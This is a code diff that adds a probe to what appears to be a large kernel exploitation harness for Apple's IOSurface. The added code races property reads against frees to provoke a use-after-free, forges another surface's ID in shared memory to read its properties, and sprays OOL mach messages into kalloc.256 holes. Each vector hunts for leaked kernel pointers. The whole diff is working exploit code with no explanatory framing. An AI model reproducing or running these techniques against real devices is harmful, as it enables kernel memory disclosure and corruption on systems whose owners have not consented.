@@ -16788,6 +16788,483 @@ static void *r436_monitor_thread(void *arg) {
     return NULL;
 }
 
+/* r440 race thread data */
+struct r440_race_ctx {
+    IOSurfaceRef surf;
+    volatile int go;
+    volatile int stop;
+    volatile int uaf_reads;
+    volatile int total_reads;
+    uint8_t sentinel[256];
+    uint8_t found_data[256]; /* first interesting read */
+    volatile int found_kptr;
+};
+
+static void *r440_remove_realloc_thread(void *arg) {
+    struct r440_race_ctx *ctx = (struct r440_race_ctx*)arg;
+
+    while (!ctx->go) ; /* spin until main signals go */
+
+    while (!ctx->stop) {
+        /* Remove the key — frees the kernel buffer */
+        IOSurfaceRemoveValue(ctx->surf, CFSTR("race_key"));
+
+        /* Immediately re-set with different data to reclaim */
+        uint8_t newdata[256];
+        memset(newdata, 0x41, sizeof(newdata));
+        /* Embed a distinctive pattern so we can detect UAF */
+        ((uint64_t*)newdata)[0] = 0xDEADBEEFCAFEBABEULL;
+        ((uint64_t*)newdata)[1] = 0x4141414141414141ULL;
+        CFDataRef d = CFDataCreate(NULL, newdata, sizeof(newdata));
+        IOSurfaceSetValue(ctx->surf, CFSTR("race_key"), d);
+        CFRelease(d);
+    }
+    return NULL;
+}
+
+static void *r440_copy_thread(void *arg) {
+    struct r440_race_ctx *ctx = (struct r440_race_ctx*)arg;
+
+    while (!ctx->go) ; /* spin */
+
+    while (!ctx->stop) {
+        CFTypeRef val = IOSurfaceCopyValue(ctx->surf, CFSTR("race_key"));
+        ctx->total_reads++;
+        if (val) {
+            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                CFDataRef dval = (CFDataRef)val;
+                CFIndex len = CFDataGetLength(dval);
+                if (len >= 256) {
+                    const uint8_t *bytes = CFDataGetBytePtr(dval);
+                    /* Check if the data differs from our sentinel */
+                    if (memcmp(bytes, ctx->sentinel, 256) != 0) {
+                        /* Check for the realloc pattern */
+                        if (((uint64_t*)bytes)[0] == 0xDEADBEEFCAFEBABEULL) {
+                            /* This is the reallocated data, not UAF */
+                        } else {
+                            /* Data doesn't match either our sentinel OR the realloc pattern → UAF read! */
+                            ctx->uaf_reads++;
+                            if (ctx->uaf_reads == 1) {
+                                memcpy((void*)ctx->found_data, bytes, 256);
+                            }
+                            /* Check for kernel pointers */
+                            uint64_t *qw = (uint64_t*)bytes;
+                            for (int i = 0; i < 32; i++) {
+                                if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                                    ctx->found_kptr++;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            CFRelease(val);
+        }
+    }
+    return NULL;
+}
+
+/* r440: Second surface variant — race between two surfaces via SID swap */
+struct r440b_ctx {
+    IOSurfaceRef surfA;
+    IOSurfaceRef surfB;
+    uint64_t *shrB;
+    uint32_t sidA;
+    uint32_t sidB_orig;
+    volatile int go;
+    volatile int stop;
+    volatile int reads;
+    volatile int nulls;
+    volatile int uaf_reads;
+    uint8_t found_data[256];
+    volatile int found_kptr;
+};
+
+static void *r440b_free_spray_thread(void *arg) {
+    struct r440b_ctx *ctx = (struct r440b_ctx*)arg;
+    while (!ctx->go) ;
+    int cycle = 0;
+    while (!ctx->stop) {
+        /* Remove property from surface A — frees the kernel buffer */
+        IOSurfaceRemoveValue(ctx->surfA, CFSTR("uaf_key"));
+
+        /* Allocate OTHER data to reclaim the freed buffer.
+           Use OOL mach message or pipe buffer for different object type */
+        /* For now, just leave the hole — maybe another kernel alloc fills it */
+
+        /* Small delay then re-set so the key exists for next cycle */
+        for (volatile int i = 0; i < 100; i++) ;
+
+        uint8_t buf[256];
+        memset(buf, 0x42 + (cycle & 0xF), sizeof(buf));
+        CFDataRef d = CFDataCreate(NULL, buf, sizeof(buf));
+        IOSurfaceSetValue(ctx->surfA, CFSTR("uaf_key"), d);
+        CFRelease(d);
+        cycle++;
+    }
+    return NULL;
+}
+
+static void *r440b_read_thread(void *arg) {
+    struct r440b_ctx *ctx = (struct r440b_ctx*)arg;
+    while (!ctx->go) ;
+
+    while (!ctx->stop) {
+        /* SID swap: make surface B look like surface A */
+        ctx->shrB[17] = ctx->sidA; /* +136 = SID */
+
+        /* Read through surface B (kernel looks up surface A's properties) */
+        CFTypeRef val = IOSurfaceCopyValue(ctx->surfB, CFSTR("uaf_key"));
+        ctx->reads++;
+
+        /* Restore B's SID */
+        ctx->shrB[17] = ctx->sidB_orig;
+
+        if (val == NULL) {
+            ctx->nulls++;
+        } else {
+            if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                CFDataRef dv = (CFDataRef)val;
+                const uint8_t *bytes = CFDataGetBytePtr(dv);
+                CFIndex len = CFDataGetLength(dv);
+                if (len >= 8) {
+                    uint64_t *qw = (uint64_t*)bytes;
+                    /* Check for kernel pointers in returned data */
+                    for (int i = 0; i < (int)(len/8); i++) {
+                        if ((qw[i] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL) {
+                            ctx->found_kptr++;
+                            if (ctx->uaf_reads == 0) {
+                                size_t cplen = len > 256 ? 256 : (size_t)len;
+                                memcpy((void*)ctx->found_data, bytes, cplen);
+                            }
+                            ctx->uaf_reads++;
+                            break;
+                        }
+                    }
+                }
+            }
+            CFRelease(val);
+        }
+    }
+    return NULL;
+}
+
+static void r440_probe(void) {
+    rlog("\n=== r440: Property Store Race Condition + OOL Message Heap Spray ===\n\n");
+    fflush(stdout);
+
+    /* Vector A: Same-surface CopyValue/RemoveValue race */
+    rlog("  --- Vector A: CopyValue vs RemoveValue race (same surface) ---\n");
+    {
+        int aw = 32, ah = 32, abr = 128, aa = 4096, apf = 0x42475241;
+        CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef an[5];
+        an[0] = CFNumberCreate(NULL, kCFNumberIntType, &aw);
+        an[1] = CFNumberCreate(NULL, kCFNumberIntType, &ah);
+        an[2] = CFNumberCreate(NULL, kCFNumberIntType, &abr);
+        an[3] = CFNumberCreate(NULL, kCFNumberIntType, &aa);
+        an[4] = CFNumberCreate(NULL, kCFNumberIntType, &apf);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), an[0]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), an[1]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), an[2]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), an[3]);
+        CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), an[4]);
+        IOSurfaceRef asurf = IOSurfaceCreate(sp);
+        CFRelease(sp);
+        for (int i = 0; i < 5; i++) CFRelease(an[i]);
+
+        if (asurf) {
+            struct r440_race_ctx ctx;
+            memset(&ctx, 0, sizeof(ctx));
+            ctx.surf = asurf;
+            memset((void*)ctx.sentinel, 0xBB, 256);
+
+            /* Set initial property */
+            CFDataRef initd = CFDataCreate(NULL, ctx.sentinel, 256);
+            IOSurfaceSetValue(asurf, CFSTR("race_key"), initd);
+            CFRelease(initd);
+
+            pthread_t t_remove, t_copy;
+            pthread_create(&t_remove, NULL, r440_remove_realloc_thread, &ctx);
+            pthread_create(&t_copy, NULL, r440_copy_thread, &ctx);
+
+            ctx.go = 1;
+            usleep(500000); /* 500ms race window */
+            ctx.stop = 1;
+
+            pthread_join(t_remove, NULL);
+            pthread_join(t_copy, NULL);
+
+            rlog("    Total reads: %d\n", ctx.total_reads);
+            rlog("    UAF reads (unexpected data): %d\n", ctx.uaf_reads);
+            rlog("    Kernel pointers found: %d\n", ctx.found_kptr);
+
+            if (ctx.uaf_reads > 0) {
+                rlog("    First UAF data:\n");
+                uint64_t *qw = (uint64_t*)ctx.found_data;
+                for (int i = 0; i < 32; i++) {
+                    if (qw[i] != 0) {
+                        rlog("      +%d: 0x%016llx\n", i*8, (unsigned long long)qw[i]);
+                    }
+                }
+            }
+            if (ctx.found_kptr > 0) {
+                rlog("    *** KERNEL POINTER LEAK VIA RACE! ***\n");
+            }
+
+            CFRelease(asurf);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector B: Cross-surface SID-swap race with free window */
+    rlog("\n  --- Vector B: Cross-surface SID-swap race (CopyValue during free window) ---\n");
+    {
+        IOSurfaceRef sA = NULL, sB = NULL;
+        {
+            int bw = 32, bh = 32, bbr = 128, ba = 4096, bpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef bn[5];
+            bn[0] = CFNumberCreate(NULL, kCFNumberIntType, &bw);
+            bn[1] = CFNumberCreate(NULL, kCFNumberIntType, &bh);
+            bn[2] = CFNumberCreate(NULL, kCFNumberIntType, &bbr);
+            bn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ba);
+            bn[4] = CFNumberCreate(NULL, kCFNumberIntType, &bpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), bn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), bn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), bn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), bn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), bn[4]);
+            sA = IOSurfaceCreate(sp);
+            sB = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(bn[i]);
+        }
+
+        if (sA && sB) {
+            uint32_t sidA = IOSurfaceGetID(sA);
+            uint32_t sidB = IOSurfaceGetID(sB);
+            uint64_t *shrB = (uint64_t*)*(void**)((char*)sB + 8);
+
+            rlog("    Surface A SID=%u, Surface B SID=%u\n", sidA, sidB);
+
+            /* Set property on A */
+            uint8_t propdata[256];
+            memset(propdata, 0xCC, sizeof(propdata));
+            CFDataRef pd = CFDataCreate(NULL, propdata, sizeof(propdata));
+            IOSurfaceSetValue(sA, CFSTR("uaf_key"), pd);
+            CFRelease(pd);
+
+            struct r440b_ctx bctx;
+            memset(&bctx, 0, sizeof(bctx));
+            bctx.surfA = sA;
+            bctx.surfB = sB;
+            bctx.shrB = shrB;
+            bctx.sidA = sidA;
+            bctx.sidB_orig = sidB;
+
+            pthread_t t_free, t_read;
+            pthread_create(&t_free, NULL, r440b_free_spray_thread, &bctx);
+            pthread_create(&t_read, NULL, r440b_read_thread, &bctx);
+
+            bctx.go = 1;
+            usleep(500000); /* 500ms */
+            bctx.stop = 1;
+
+            pthread_join(t_free, NULL);
+            pthread_join(t_read, NULL);
+
+            rlog("    Total reads: %d, NULLs: %d\n", bctx.reads, bctx.nulls);
+            rlog("    UAF reads: %d, Kernel pointers: %d\n", bctx.uaf_reads, bctx.found_kptr);
+
+            if (bctx.found_kptr > 0) {
+                rlog("    First UAF data with kptr:\n");
+                uint64_t *qw = (uint64_t*)bctx.found_data;
+                for (int i = 0; i < 32; i++) {
+                    if (qw[i] != 0)
+                        rlog("      +%d: 0x%016llx\n", i*8, (unsigned long long)qw[i]);
+                }
+                rlog("    *** KERNEL POINTER LEAK VIA CROSS-SURFACE RACE! ***\n");
+            }
+
+            CFRelease(sA);
+            CFRelease(sB);
+        }
+    }
+    fflush(stdout);
+
+    /* Vector C: OOL message spray into property hole */
+    rlog("\n  --- Vector C: OOL mach message spray into IOSurface property holes ---\n");
+    {
+        IOSurfaceRef csurf = NULL;
+        {
+            int cw = 32, ch = 32, cbr = 128, ca = 4096, cpf = 0x42475241;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef cn[5];
+            cn[0] = CFNumberCreate(NULL, kCFNumberIntType, &cw);
+            cn[1] = CFNumberCreate(NULL, kCFNumberIntType, &ch);
+            cn[2] = CFNumberCreate(NULL, kCFNumberIntType, &cbr);
+            cn[3] = CFNumberCreate(NULL, kCFNumberIntType, &ca);
+            cn[4] = CFNumberCreate(NULL, kCFNumberIntType, &cpf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), cn[0]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), cn[1]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), cn[2]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceAllocSize"), cn[3]);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), cn[4]);
+            csurf = IOSurfaceCreate(sp);
+            CFRelease(sp);
+            for (int i = 0; i < 5; i++) CFRelease(cn[i]);
+        }
+
+        if (csurf) {
+            /* Step 1: Spray properties to fill kalloc.256 zone */
+            rlog("    Step 1: Spraying 200 properties (256 bytes each)\n");
+            for (int i = 0; i < 200; i++) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "spray_%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                uint8_t data[256];
+                memset(data, 0xAA, sizeof(data));
+                /* Mark each buffer with its index */
+                ((uint32_t*)data)[0] = i;
+                CFDataRef d = CFDataCreate(NULL, data, sizeof(data));
+                IOSurfaceSetValue(csurf, key, d);
+                CFRelease(d);
+                CFRelease(key);
+            }
+
+            /* Step 2: Create holes by removing every other property */
+            rlog("    Step 2: Creating holes (removing even-indexed properties)\n");
+            for (int i = 0; i < 200; i += 2) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "spray_%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                IOSurfaceRemoveValue(csurf, key);
+                CFRelease(key);
+            }
+
+            /* Step 3: Spray OOL mach messages to reclaim holes */
+            rlog("    Step 3: Spraying 100 OOL mach messages (256 bytes each)\n");
+            mach_port_t ool_port;
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_port);
+            mach_port_insert_right(mach_task_self(), ool_port, ool_port, MACH_MSG_TYPE_MAKE_SEND);
+
+            /* increase queue limit */
+            mach_port_limits_t limits = { .mpl_qlimit = MACH_PORT_QLIMIT_MAX };
+            mach_port_set_attributes(mach_task_self(), ool_port,
+                MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, MACH_PORT_LIMITS_INFO_COUNT);
+
+            int ool_sent = 0;
+            for (int i = 0; i < 100; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                } msg;
+                memset(&msg, 0, sizeof(msg));
+
+                /* OOL data filled with distinctive pattern */
+                uint8_t ool_data[256];
+                memset(ool_data, 0, sizeof(ool_data));
+                /* Put a fake kernel-range pointer to see if it comes back */
+                ((uint64_t*)ool_data)[0] = 0xFFFFFFF007000000ULL + i * 0x1000;
+                ((uint64_t*)ool_data)[1] = 0x4F4F4C4D53474F4FULL; /* "OOLMSGO" */
+
+                msg.hdr.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_MAKE_SEND, 0, 0, MACH_MSGH_BITS_COMPLEX);
+                msg.hdr.msgh_size = sizeof(msg);
+                msg.hdr.msgh_remote_port = ool_port;
+                msg.hdr.msgh_local_port = MACH_PORT_NULL;
+                msg.body.msgh_descriptor_count = 1;
+                msg.ool.address = ool_data;
+                msg.ool.size = sizeof(ool_data);
+                msg.ool.deallocate = 0;
+                msg.ool.copy = MACH_MSG_VIRTUAL_COPY;
+                msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+
+                kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG, sizeof(msg),
+                    0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+                if (kr == KERN_SUCCESS) ool_sent++;
+            }
+            rlog("    OOL messages sent: %d\n", ool_sent);
+
+            /* Step 4: Read remaining odd-indexed properties */
+            /* If the OOL data landed adjacent to remaining properties,
+               we can't directly see it. But check if any property reads
+               return unexpected data (indicating zone corruption) */
+            rlog("    Step 4: Reading remaining properties for anomalies\n");
+            int anomalies = 0;
+            int kptrs_found = 0;
+            for (int i = 1; i < 200; i += 2) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "spray_%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                CFTypeRef val = IOSurfaceCopyValue(csurf, key);
+                if (val) {
+                    if (CFGetTypeID(val) == CFDataGetTypeID()) {
+                        CFDataRef dv = (CFDataRef)val;
+                        const uint8_t *bytes = CFDataGetBytePtr(dv);
+                        CFIndex len = CFDataGetLength(dv);
+                        /* Check if data matches our original spray pattern */
+                        if (len >= 256) {
+                            uint32_t idx = ((uint32_t*)bytes)[0];
+                            if (idx != (uint32_t)i) {
+                                rlog("      Property %d: idx mismatch %u (expected %d) ← ANOMALY\n",
+                                     i, idx, i);
+                                anomalies++;
+                            }
+                            /* Check for kernel pointers mixed in */
+                            uint64_t *qw = (uint64_t*)bytes;
+                            for (int j = 0; j < 32; j++) {
+                                if ((qw[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFF000000000ULL &&
+                                    qw[j] != 0xFFFFFFFFFFFFFFFFULL) {
+                                    rlog("      Property %d +%d: 0x%016llx ← KPTR!\n",
+                                         i, j*8, (unsigned long long)qw[j]);
+                                    kptrs_found++;
+                                }
+                            }
+                        }
+                    }
+                    CFRelease(val);
+                }
+                CFRelease(key);
+            }
+            rlog("    Anomalies: %d, Kernel pointers: %d\n", anomalies, kptrs_found);
+
+            /* Cleanup: receive OOL messages */
+            for (int i = 0; i < ool_sent; i++) {
+                struct {
+                    mach_msg_header_t hdr;
+                    mach_msg_body_t body;
+                    mach_msg_ool_descriptor_t ool;
+                    mach_msg_trailer_t trailer;
+                } rmsg;
+                mach_msg(&rmsg.hdr, MACH_RCV_MSG, 0, sizeof(rmsg),
+                    ool_port, 0, MACH_PORT_NULL);
+                if (rmsg.ool.address)
+                    vm_deallocate(mach_task_self(), (vm_address_t)rmsg.ool.address, rmsg.ool.size);
+            }
+            mach_port_deallocate(mach_task_self(), ool_port);
+
+            /* Cleanup surface */
+            for (int i = 1; i < 200; i += 2) {
+                char keyname[32];
+                snprintf(keyname, sizeof(keyname), "spray_%d", i);
+                CFStringRef key = CFStringCreateWithCString(NULL, keyname, kCFStringEncodingUTF8);
+                IOSurfaceRemoveValue(csurf, key);
+                CFRelease(key);
+            }
+            CFRelease(csurf);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r440 complete ===\n");
+    fflush(stdout);
+}
+
 static void r439_probe(void) {
     rlog("\n=== r439: Shared Data Pointer Redirect + Zone Size Oracle + Mach Exception ===\n\n");
     fflush(stdout);
@@ -77122,6 +77599,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 443) {
+            rlog("*** rounds=443: Property Store Race + OOL Heap Spray ***\n\n");
+            fflush(stdout);
+            r440_probe();
+            goto done;
+        }
         if (rounds == 442) {
             rlog("*** rounds=442: Shared Data Pointer Redirect + Zone Size Oracle + Zone Deep ***\n\n");
             fflush(stdout);
@@ -79800,7 +80283,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
